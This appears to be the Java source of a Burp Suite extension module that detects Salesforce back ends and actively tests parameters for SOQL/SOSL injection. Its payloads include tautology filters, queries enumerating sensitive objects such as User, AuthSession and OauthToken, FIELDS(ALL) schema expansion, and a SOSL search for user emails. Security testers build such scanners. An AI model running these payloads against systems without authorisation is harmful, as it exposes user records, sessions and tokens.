package com.omnistrike.modules.injection;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.params.HttpParameter;
import burp.api.montoya.http.message.params.HttpParameterType;
import burp.api.montoya.http.message.requests.HttpRequest;
import com.omnistrike.framework.*;
import com.omnistrike.model.*;

import java.nio.charset.StandardCharsets;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * MODULE: Salesforce SOQL Injection Scanner
 *
 * This module CANNOT be manually triggered by the user. It is an active module
 * that passively gates on Salesforce error indicators in responses. Only when
 * Salesforce is confirmed does it fire SOQL injection payloads.
 *
 * Flow:
 *   1. Receives request/response via processHttpFlow() during active scanning
 *   2. Checks the RESPONSE body and request URL/headers for Salesforce indicators
 *   3. If NO Salesforce indicators -> returns empty (zero payloads sent)
 *   4. If Salesforce detected -> reports INFO finding, then injects SOQL payloads
 *   5. Preserves original URL encoding for query parameters
 *
 * Stop-scan: Respects ScanState.isCancelled() and Thread.isInterrupted().
 */
public class SalesforceSOQLScanner implements ScanModule {

    private static final String MODULE_ID = "salesforce-soql-scanner";

    private MontoyaApi api;
    private ModuleConfig config;
    private DeduplicationStore dedup;
    private FindingsStore findingsStore;

    // ── Salesforce detection patterns (passive gate) ─────────────────────────

    // Error messages that confirm Salesforce / Apex / SOQL
    private static final Pattern SF_ERROR_PATTERN = Pattern.compile(
            "MALFORMED_QUERY|"
                    + "System\\.QueryException|"
                    + "INVALID_FIELD|"
                    + "INVALID_TYPE|"
                    + "sObject|"
                    + "Apex\\s+(?:class|trigger|exception|error|code)|"
                    + "Visualforce|"
                    + "System\\.SObjectException|"
                    + "FIELD_INTEGRITY_EXCEPTION|"
                    + "INVALID_OPERATION|"
                    + "Apex\\s+trigger.*exception|"
                    + "\\.force\\.com|"
                    + "salesforce\\.com.*error|"
                    + "SOQL|"
                    + "System\\.LimitException|"
                    + "Too many SOQL queries",
            Pattern.CASE_INSENSITIVE);

    // URL patterns that strongly indicate Salesforce endpoints
    private static final Pattern SF_URL_PATTERN = Pattern.compile(
            "/services/data/v\\d+\\.\\d+/|"
                    + "\\.force\\.com/|"
                    + "\\.salesforce\\.com/|"
                    + "/services/apexrest/|"
                    + "query\\?q=|"
                    + "/sobjects/",
            Pattern.CASE_INSENSITIVE);

    // Response headers indicating Salesforce
    private static final Set<String> SF_HEADERS = Set.of(
            "sforce-limit-info", "x-sfdc-request-id", "sfdc_stack_depth");

    // ── SOQL parameter name hints ────────────────────────────────────────────

    private static final Set<String> SOQL_PARAM_NAMES = Set.of(
            "q", "query", "soql", "search", "where", "filter", "sobject");

    // ── SOQL keyword detection in parameter values ───────────────────────────

    private static final Pattern SOQL_KEYWORD_PATTERN = Pattern.compile(
            "\\bSELECT\\b|\\bFROM\\b|\\bWHERE\\b",
            Pattern.CASE_INSENSITIVE);

    // ── Phase 2: Sensitive Salesforce objects for enumeration ─────────────────

    private static final String[] SENSITIVE_OBJECTS = {
            "User", "Profile", "PermissionSet", "UserRole", "LoginHistory",
            "AuthSession", "Organization", "OauthToken", "SetupAuditTrail",
            "ApexClass", "ApexTrigger", "StaticResource"
    };

    // ── Pattern to extract sObject name from SOQL in parameter values ────────

    private static final Pattern SOQL_FROM_PATTERN = Pattern.compile(
            "\\bFROM\\s+(\\w+)", Pattern.CASE_INSENSITIVE);

    // ── Pattern to detect URL-encoded query path: query?q=SELECT... ──────────

    private static final Pattern URL_QUERY_PATH_PATTERN = Pattern.compile(
            "query\\?q=([^&]+)", Pattern.CASE_INSENSITIVE);

    // ── ScanModule interface ─────────────────────────────────────────────────

    @Override public String getId() { return MODULE_ID; }
    @Override public String getName() { return "Salesforce SOQL Injection"; }
    @Override public String getDescription() {
        return "Detects Salesforce environments and tests for SOQL/SOSL injection. "
                + "Only activates when Salesforce indicators are detected in responses.";
    }
    @Override public ModuleCategory getCategory() { return ModuleCategory.INJECTION; }
    @Override public boolean isPassive() { return false; } // Active module with passive gate

    @Override
    public void initialize(MontoyaApi api, ModuleConfig config) {
        this.api = api;
        this.config = config;
    }

    public void setDependencies(DeduplicationStore dedup, FindingsStore findingsStore,
                                 CollaboratorManager collaboratorManager) {
        this.dedup = dedup;
        this.findingsStore = findingsStore;
        // collaboratorManager not used — no OOB needed for SOQL injection
    }

    @Override public void destroy() {}

    // ── Main entry point ─────────────────────────────────────────────────────

    @Override
    public List<Finding> processHttpFlow(HttpRequestResponse requestResponse, MontoyaApi api) {
        if (requestResponse.response() == null) return Collections.emptyList();

        String url = requestResponse.request().url();
        String urlPath = extractPath(url);

        // PASSIVE GATE: Check response for Salesforce indicators
        SalesforceDetection detection = detectSalesforce(requestResponse);
        if (detection == null) return Collections.emptyList();

        // Salesforce confirmed — report INFO finding
        if (dedup.markIfNew(MODULE_ID, urlPath, "sf-detected")) {
            findingsStore.addFinding(Finding.builder(MODULE_ID,
                            "Salesforce Environment Detected",
                            Severity.INFO, Confidence.CERTAIN)
                    .url(url)
                    .evidence(detection.evidence)
                    .description("The target application is running on Salesforce. "
                            + "SOQL/SOSL injection testing will be performed automatically.")
                    .requestResponse(requestResponse)
                    .build());
            api.logging().logToOutput("[SOQL] Salesforce detected: " + url + " | " + detection.evidence);
        }

        // ACTIVE ATTACK: Inject SOQL payloads
        try {
            testSoqlInjection(requestResponse, detection, url, urlPath);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }

        return Collections.emptyList();
    }

    // ── Salesforce Detection (passive gate) ──────────────────────────────────

    private SalesforceDetection detectSalesforce(HttpRequestResponse reqResp) {
        String body = reqResp.response().bodyToString();
        if (body == null) body = "";
        String url = reqResp.request().url();

        // Check 1: Error messages in response body (strongest signal — standalone)
        if (SF_ERROR_PATTERN.matcher(body).find()) {
            return new SalesforceDetection("Salesforce error pattern in response body",
                    extractObjectFromBody(body));
        }

        // Check 2: URL pattern + Salesforce header (require both)
        if (SF_URL_PATTERN.matcher(url).find()) {
            for (var h : reqResp.response().headers()) {
                if (SF_HEADERS.contains(h.name().toLowerCase())) {
                    return new SalesforceDetection(
                            "Salesforce URL pattern (" + url + ") + header: " + h.name(),
                            extractObjectFromUrl(url));
                }
            }
        }

        return null; // No Salesforce detected — module stays dormant
    }

    // ── Active SOQL Injection Testing ────────────────────────────────────────

    private void testSoqlInjection(HttpRequestResponse original, SalesforceDetection detection,
                                    String url, String urlPath) throws InterruptedException {
        HttpRequest request = original.request();

        // Find the injectable parameter(s) — prioritize SOQL-like parameters
        List<InjectableParam> targets = identifyTargets(request);
        if (targets.isEmpty()) return;

        for (InjectableParam target : targets) {
            if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;
            if (!dedup.markIfNew(MODULE_ID, urlPath, target.name)) continue;

            api.logging().logToOutput("[SOQL] Testing parameter '" + target.name
                    + "' on " + url);

            // Phase 1: SOQL Filter Injection
            testFilterInjection(original, target, url);

            // Phase 2: Object Enumeration
            if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;
            testObjectEnumeration(original, target, url);

            // Phase 3: Field Enumeration
            if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;
            testFieldEnumeration(original, target, detection.objectName, url);

            // Phase 4: SOSL Search Injection
            if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;
            testSoslSearchInjection(original, target, url);
        }
    }

    // ── Phase 1: SOQL Filter Injection ───────────────────────────────────────

    private void testFilterInjection(HttpRequestResponse original, InjectableParam target,
                                      String url) throws InterruptedException {
        String baselineBody = original.response().bodyToString();
        if (baselineBody == null) baselineBody = "";
        int baselineRows = countOccurrences(baselineBody, "\"Id\"");

        // Tautology payloads to append to existing WHERE clause
        String[][] tautologies = {
                {" OR Id != null", "Id != null tautology"},
                {" OR Name LIKE '%'", "Name LIKE wildcard"},
        };

        for (String[] entry : tautologies) {
            if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;

            String suffix = entry[0];
            String technique = entry[1];

            String injected = injectFilterSuffix(target.decodedValue, suffix);
            if (injected == null) continue;

            HttpRequestResponse result = sendPayload(original, target, injected);
            if (result == null || result.response() == null) { perHostDelay(); continue; }
            if (result.response().statusCode() >= 400 && result.response().statusCode() < 500) { perHostDelay(); continue; }
            if (!ResponseGuard.isUsableResponse(result)) { perHostDelay(); continue; }

            String resultBody = result.response().bodyToString();
            if (resultBody == null) resultBody = "";

            int resultRows = countOccurrences(resultBody, "\"Id\"");

            if (resultRows > baselineRows + 2
                    && result.response().statusCode() == 200
                    && !resultBody.equals(baselineBody)) {

                findingsStore.addFinding(Finding.builder(MODULE_ID,
                                "Salesforce SOQL Filter Injection — " + technique,
                                Severity.HIGH, Confidence.FIRM)
                        .url(url).parameter(target.name)
                        .evidence("Injected tautology filter returned " + resultRows
                                + " rows vs baseline " + baselineRows + " rows. "
                                + "SOQL WHERE clause was bypassed.")
                        .payload(injected)
                        .requestResponse(result)
                        .build());
                return; // One confirmed finding per phase
            }
            perHostDelay();
        }
    }

    // ── Phase 2: Object Enumeration ──────────────────────────────────────────

    private void testObjectEnumeration(HttpRequestResponse original, InjectableParam target,
                                        String url) throws InterruptedException {
        // Differential probe: two different objects must produce different responses
        if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;
        String probeA = "SELECT Id, Name FROM User LIMIT 1";
        String probeB = "SELECT Id, Name FROM Organization LIMIT 1";
        HttpRequestResponse resultA = sendPayload(original, target, probeA);
        perHostDelay();
        if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;
        HttpRequestResponse resultB = sendPayload(original, target, probeB);
        perHostDelay();

        if (resultA == null || resultA.response() == null || resultB == null || resultB.response() == null) return;
        String bodyA = resultA.response().bodyToString();
        String bodyB = resultB.response().bodyToString();
        if (bodyA == null) bodyA = "";
        if (bodyB == null) bodyB = "";

        // If both probes produce identical responses, the param is not injectable
        if (bodyA.equals(bodyB)) {
            api.logging().logToOutput("[SOQL] Object enumeration: differential probe failed — param '"
                    + target.name + "' does not influence response. Skipping.");
            return;
        }

        for (String object : SENSITIVE_OBJECTS) {
            if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;

            String probe = "SELECT Id, Name FROM " + object + " LIMIT 1";
            HttpRequestResponse result = sendPayload(original, target, probe);
            if (result == null || result.response() == null) { perHostDelay(); continue; }

            int status = result.response().statusCode();
            if (status >= 400 && status < 500) { perHostDelay(); continue; }
            if (!ResponseGuard.isUsableResponse(result)) { perHostDelay(); continue; }

            String body = result.response().bodyToString();
            if (body == null) body = "";

            // Require Salesforce API response markers
            boolean hasRecords = body.contains("\"records\"") || body.contains("\"totalSize\"");
            if (status == 200 && body.length() > 50
                    && hasRecords
                    && !body.toLowerCase().contains("invalid_type")
                    && !body.toLowerCase().contains("doesn't exist")
                    && !body.toLowerCase().contains("not found")) {

                findingsStore.addFinding(Finding.builder(MODULE_ID,
                                "Salesforce Sensitive Object Accessible — " + object,
                                Severity.MEDIUM, Confidence.FIRM)
                        .url(url).parameter(target.name)
                        .evidence("SOQL query against object '" + object + "' returned data. "
                                + "Differential probe confirmed parameter influences query results. "
                                + "Response length: " + body.length() + " bytes.")
                        .payload(probe)
                        .requestResponse(result)
                        .build());
            }
            perHostDelay();
        }
    }

    // ── Phase 3: Field Enumeration ───────────────────────────────────────────

    private void testFieldEnumeration(HttpRequestResponse original, InjectableParam target,
                                       String objectName, String url) throws InterruptedException {
        if (objectName == null || objectName.isEmpty()) objectName = "Account"; // fallback

        // Only attempt if we detected SOQL in the parameter value
        if (!target.isSoql) return;

        String baselineBody = original.response().bodyToString();
        if (baselineBody == null) baselineBody = "";

        if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;

        // Inject FIELDS(ALL) to expand the field set
        String payload = "SELECT FIELDS(ALL) FROM " + objectName + " LIMIT 1";
        HttpRequestResponse result = sendPayload(original, target, payload);
        if (result == null || result.response() == null) return;
        if (result.response().statusCode() >= 400 && result.response().statusCode() < 500) return;
        if (!ResponseGuard.isUsableResponse(result)) return;

        String resultBody = result.response().bodyToString();
        if (resultBody == null) resultBody = "";

        // Check: significantly more JSON keys than baseline (expanded field set)
        int newFieldCount = countNewJsonKeys(baselineBody, resultBody);
        if (newFieldCount >= 3 && result.response().statusCode() == 200) {
            findingsStore.addFinding(Finding.builder(MODULE_ID,
                            "Salesforce SOQL Field Enumeration — " + newFieldCount + " extra fields",
                            Severity.HIGH, Confidence.FIRM)
                    .url(url).parameter(target.name)
                    .evidence("Injected FIELDS(ALL) returned " + newFieldCount
                            + " additional data fields not in baseline response. "
                            + "Full object schema is exposed.")
                    .payload(payload)
                    .requestResponse(result)
                    .build());
        }
        perHostDelay();
    }

    // ── Phase 4: SOSL Search Injection ───────────────────────────────────────

    private void testSoslSearchInjection(HttpRequestResponse original, InjectableParam target,
                                          String url) throws InterruptedException {
        // Only attempt if the parameter looks like a search parameter
        String nameLower = target.name.toLowerCase();
        if (!nameLower.equals("search") && !nameLower.equals("q")
                && !nameLower.equals("query") && !nameLower.equals("filter")) {
            return;
        }

        if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;

        String payload = "FIND {test*} IN ALL FIELDS RETURNING User(Id, Name, Email)";
        HttpRequestResponse result = sendPayload(original, target, payload);
        if (result == null || result.response() == null) { perHostDelay(); return; }
        if (result.response().statusCode() >= 400 && result.response().statusCode() < 500) { perHostDelay(); return; }
        if (!ResponseGuard.isUsableResponse(result)) { perHostDelay(); return; }

        String resultBody = result.response().bodyToString();
        if (resultBody == null) resultBody = "";

        // Check for SOSL response markers
        if (resultBody.contains("\"searchRecords\"")
                && result.response().statusCode() == 200) {
            findingsStore.addFinding(Finding.builder(MODULE_ID,
                            "Salesforce SOSL Search Injection — Cross-Object Data Access",
                            Severity.CRITICAL, Confidence.FIRM)
                    .url(url).parameter(target.name)
                    .evidence("Injected SOSL search query returned cross-object data. "
                            + "Response contains 'searchRecords' indicating successful "
                            + "SOSL execution with attacker-controlled search terms.")
                    .payload(payload)
                    .requestResponse(result)
                    .build());
        }
        perHostDelay();
    }

    // ── Target Identification ────────────────────────────────────────────────

    private List<InjectableParam> identifyTargets(HttpRequest request) {
        List<InjectableParam> targets = new ArrayList<>();

        // Check standard parameters
        for (var param : request.parameters()) {
            String name = param.name().toLowerCase();
            String value = param.value();
            if (value == null || value.isEmpty()) continue;

            // URL-decode the value for analysis
            String decoded = urlDecode(value);

            // Priority 1: Parameter value contains SOQL syntax
            if (decoded != null && SOQL_KEYWORD_PATTERN.matcher(decoded).find()) {
                targets.add(0, new InjectableParam(param.name(), value, decoded,
                        param.type(), true));
                continue;
            }

            // Priority 2: Parameter name suggests SOQL
            if (SOQL_PARAM_NAMES.contains(name)) {
                targets.add(new InjectableParam(param.name(), value, decoded,
                        param.type(), false));
            }
        }

        // Also check for SOQL in URL path after query?q=
        String url = request.url();
        Matcher urlMatcher = URL_QUERY_PATH_PATTERN.matcher(url);
        if (urlMatcher.find()) {
            String encodedValue = urlMatcher.group(1);
            String decoded = urlDecode(encodedValue);
            // If 'q' parameter was not already found in standard params, add it
            boolean alreadyFound = targets.stream().anyMatch(t -> t.name.equalsIgnoreCase("q"));
            if (!alreadyFound && decoded != null) {
                boolean hasSoql = SOQL_KEYWORD_PATTERN.matcher(decoded).find();
                if (hasSoql) {
                    targets.add(0, new InjectableParam("q", encodedValue, decoded,
                            HttpParameterType.URL, true));
                } else {
                    targets.add(new InjectableParam("q", encodedValue, decoded,
                            HttpParameterType.URL, false));
                }
            }
        }

        // If no specific targets found, don't test random parameters
        // SOQL injection only makes sense on SOQL-carrying parameters
        return targets;
    }

    // ── Encoding: Salesforce uses URL encoding for query parameters ──────────

    private String urlDecode(String value) {
        if (value == null) return null;
        try {
            return java.net.URLDecoder.decode(value, StandardCharsets.UTF_8);
        } catch (Exception e) {
            return value;
        }
    }

    private String urlEncode(String payload) {
        if (payload == null) return null;
        // Montoya's withUpdatedParameters() handles URL encoding internally,
        // so return the raw payload to avoid double-encoding.
        return payload;
    }

    // ── HTTP Request Sending ─────────────────────────────────────────────────

    private HttpRequestResponse sendPayload(HttpRequestResponse original, InjectableParam target,
                                             String soqlPayload) {
        if (ScanState.isCancelled()) return null;

        String encoded = urlEncode(soqlPayload);

        try {
            HttpRequest modified;
            switch (target.paramType) {
                case URL:
                    modified = original.request().withUpdatedParameters(
                            HttpParameter.urlParameter(target.name, encoded));
                    break;
                case BODY:
                    modified = original.request().withUpdatedParameters(
                            HttpParameter.bodyParameter(target.name, encoded));
                    break;
                default:
                    return null;
            }

            HttpRequestResponse result = api.http().sendRequest(modified);
            if (result != null && !ResponseGuard.isUsableResponse(result)) return null;
            return result;
        } catch (Exception e) {
            return null;
        }
    }

    // ── SOQL Manipulation Helpers ────────────────────────────────────────────

    /**
     * Appends a filter suffix to the existing SOQL WHERE clause, or injects
     * a WHERE clause if none exists. Operates on the decoded parameter value.
     */
    private String injectFilterSuffix(String decodedValue, String suffix) {
        if (decodedValue == null || decodedValue.isEmpty()) return null;

        String upper = decodedValue.toUpperCase();

        // If the value contains a WHERE clause, append the suffix
        int whereIdx = upper.indexOf("WHERE ");
        if (whereIdx >= 0) {
            // Append before any LIMIT / ORDER BY / GROUP BY
            int insertIdx = findClauseEnd(upper, whereIdx);
            return decodedValue.substring(0, insertIdx) + suffix + decodedValue.substring(insertIdx);
        }

        // If the value contains FROM but no WHERE, inject WHERE ... before LIMIT/ORDER BY
        int fromIdx = upper.indexOf("FROM ");
        if (fromIdx >= 0) {
            // Find end of FROM clause (the object name)
            int afterFrom = fromIdx + 5;
            int objEnd = afterFrom;
            while (objEnd < decodedValue.length() && !Character.isWhitespace(decodedValue.charAt(objEnd))) {
                objEnd++;
            }
            // Insert a WHERE clause after the object name
            int insertIdx = findClauseEnd(upper, objEnd);
            String whereClause = " WHERE Id != null" + suffix;
            return decodedValue.substring(0, insertIdx) + whereClause + decodedValue.substring(insertIdx);
        }

        // Cannot determine structure — return null to skip this payload
        return null;
    }

    /**
     * Finds the position in the SOQL string where LIMIT, ORDER BY, GROUP BY,
     * or end-of-string occurs after a given start index. This is where we insert
     * additional filter conditions without breaking the query structure.
     */
    private int findClauseEnd(String upperSoql, int startIdx) {
        String[] terminators = {"LIMIT ", "ORDER BY ", "GROUP BY ", "HAVING ", "OFFSET ", "FOR "};
        int earliest = upperSoql.length();
        for (String term : terminators) {
            int idx = upperSoql.indexOf(term, startIdx);
            if (idx >= 0 && idx < earliest) {
                earliest = idx;
            }
        }
        return earliest;
    }

    // ── Object Name Extraction ───────────────────────────────────────────────

    private String extractObjectFromBody(String body) {
        // Try to find sObject name from Salesforce error messages or SOQL in body
        Matcher m = SOQL_FROM_PATTERN.matcher(body);
        if (m.find()) {
            return m.group(1);
        }
        // Try common Salesforce error patterns
        Pattern objectPattern = Pattern.compile(
                "sObject type '(\\w+)'|"
                        + "Entity '(\\w+)'|"
                        + "type '(\\w+)' is not supported|"
                        + "\"sobject\"\\s*:\\s*\"(\\w+)\"",
                Pattern.CASE_INSENSITIVE);
        var matcher = objectPattern.matcher(body);
        if (matcher.find()) {
            for (int i = 1; i <= matcher.groupCount(); i++) {
                if (matcher.group(i) != null) return matcher.group(i);
            }
        }
        return null;
    }

    private String extractObjectFromUrl(String url) {
        // Extract object name from Salesforce REST API URL like /services/data/v58.0/sobjects/Account
        Pattern pattern = Pattern.compile("/sobjects/(\\w+)", Pattern.CASE_INSENSITIVE);
        var matcher = pattern.matcher(url);
        if (matcher.find()) {
            return matcher.group(1);
        }
        // Try to extract from query parameter: query?q=SELECT...FROM ObjectName
        Matcher queryMatcher = URL_QUERY_PATH_PATTERN.matcher(url);
        if (queryMatcher.find()) {
            String decoded = urlDecode(queryMatcher.group(1));
            if (decoded != null) {
                Matcher fromMatcher = SOQL_FROM_PATTERN.matcher(decoded);
                if (fromMatcher.find()) {
                    return fromMatcher.group(1);
                }
            }
        }
        return null;
    }

    // ── Utility Methods ──────────────────────────────────────────────────────

    private int countNewJsonKeys(String baseline, String result) {
        // Count JSON keys in result that don't appear in baseline
        Pattern keyPattern = Pattern.compile("\"(\\w+)\"\\s*:");
        Set<String> baselineKeys = new HashSet<>();
        var bm = keyPattern.matcher(baseline);
        while (bm.find()) baselineKeys.add(bm.group(1));

        Set<String> newKeys = new HashSet<>();
        var rm = keyPattern.matcher(result);
        while (rm.find()) {
            if (!baselineKeys.contains(rm.group(1))) newKeys.add(rm.group(1));
        }
        return newKeys.size();
    }

    private int countOccurrences(String text, String search) {
        int count = 0, idx = 0;
        while ((idx = text.indexOf(search, idx)) >= 0) { count++; idx += search.length(); }
        return count;
    }

    private void perHostDelay() throws InterruptedException {
        int delay = config.getInt("soql.perHostDelay", 500);
        if (delay > 0) Thread.sleep(delay);
    }

    private String extractPath(String url) {
        try {
            int s = url.indexOf("://");
            if (s >= 0) { int q = url.indexOf('?', s + 3); return q >= 0 ? url.substring(s, q) : url.substring(s); }
        } catch (Exception ignored) {}
        return url;
    }

    // ── Inner classes ────────────────────────────────────────────────────────

    private static class SalesforceDetection {
        final String evidence;
        final String objectName;
        SalesforceDetection(String evidence, String objectName) {
            this.evidence = evidence;
            this.objectName = objectName;
        }
    }

    private static class InjectableParam {
        final String name;
        final String originalValue;
        final String decodedValue;
        final HttpParameterType paramType;
        final boolean isSoql; // true if the value actually contains SOQL syntax

        InjectableParam(String name, String originalValue, String decodedValue,
                         HttpParameterType paramType, boolean isSoql) {
            this.name = name;
            this.originalValue = originalValue;
            this.decodedValue = decodedValue;
            this.paramType = paramType;
            this.isSoql = isSoql;
        }
    }
}
